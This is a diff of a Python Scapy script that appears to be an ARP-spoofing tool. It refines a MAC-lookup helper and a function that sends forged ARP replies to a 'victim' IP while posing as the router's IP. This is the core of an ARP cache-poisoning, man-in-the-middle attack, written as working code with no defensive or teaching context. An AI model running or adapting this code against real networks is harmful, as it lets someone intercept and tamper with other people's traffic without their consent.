@@ -20,14 +20,12 @@ def gate_way():
 #
 def mac(ip):
         arpRequest = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
-        arpRequest.show()
-     
         arpRespone = srp1(arpRequest, timeout=1,verbose=0, retry=0, multi=0)
         if arpRespone:
                 return arpRespone.hwsrc
 
 
-def doc(routerIP, victimIP, routerMAC, victimMAC):
+def doc(routerIP, victimIP, victimMAC):
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
 
 
